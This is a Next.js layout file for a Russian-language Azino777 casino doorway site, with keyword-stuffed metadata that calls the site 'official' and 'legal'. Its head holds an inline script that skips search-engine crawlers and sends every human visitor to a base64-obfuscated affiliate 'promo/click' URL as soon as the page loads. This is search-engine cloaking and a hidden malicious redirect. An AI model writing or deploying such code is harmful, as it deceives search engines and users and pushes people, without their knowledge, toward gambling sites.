import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const randomTitle = [
  'Azino777 официальный сайт мобайл казино | легальные игры онлайн',
  'Azino777 казино мобайл | официальный сайт | играй и выигрывай',
  'Официальный Azino 777 мобайл | быстрое казино лучших игр',
  'Azino 777 официальный казино | мобильное казино для игроков',
  'Azino777 официальный | играй в мобайл казино прямо сейчас',
]

const randomDescription = [
  'Azino777 официальный сайт казино мобайл. Быстрая регистрация, большие выигрыши и популярные игры. Официальное казино Azino 777 для игроков.',
  'Официальное казино Azino777 на мобайл. Лучшие игры, удобный интерфейс и честные выплаты. Azino 777 мобайл - ваше казино.',
  'Azino777 мобайл казино - официальный сайт с играми. Быстрые транзакции, лучший выбор игр и щедрые бонусы для игроков.',
  'Официальный Azino 777 казино мобайл приложение. Играй безопасно, выигрывай большие суммы, получай бонусы каждый день.',
  'Azino 777 официальный казино сайт мобайл версия. Лучшие слоты, быстрая поддержка и надежные выплаты для всех игроков.',
]

const getRandomItem = (arr: string[]): string => {
  return arr[Math.floor(Math.random() * arr.length)]
}

export const metadata: Metadata = {
  title: getRandomItem(randomTitle),
  description: getRandomItem(randomDescription),
  generator: 'v0',
  canonical: 'https://azino777-13casino.vercel.app/',
  robots: 'index, follow',
  openGraph: {
    type: 'website',
    url: 'https://azino777-13casino.vercel.app/',
    title: getRandomItem(randomTitle),
    description: getRandomItem(randomDescription),
    images: [
      {
        url: 'https://azino777-13casino.vercel.app/azino777-hero.png',
        width: 1200,
        height: 630,
        alt: 'Azino777 официальный казино мобайл',
      },
    ],
  },
  icons: {
    icon: '/azino777-favicon.png',
    apple: '/azino777-favicon.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: [
    { media: '(prefers-color-scheme: dark)', color: '#1f2937' },
  ],
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="scroll-smooth">
      <head>
        <meta name="yandex-verification" content="72576d3455e56682" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=yes" />
        <meta name="theme-color" content="#1f2937" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <link rel="canonical" href="https://azino777-13casino.vercel.app/" />
        <meta name="image" content="https://azino777-13casino.vercel.app/azino777-hero.png" />
        <meta property="og:image:alt" content="Azino777 официальный казино мобайл" />
        <meta name="twitter:card" content="summary_large_image" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "IGh0dHBzOi8vazBtLmJoZjU3YjY3OGYuY29tL3Byb21vL2NsaWNrLzZhOTAwYTJkMzEzYWE="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className="antialiased bg-slate-950 text-slate-50">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
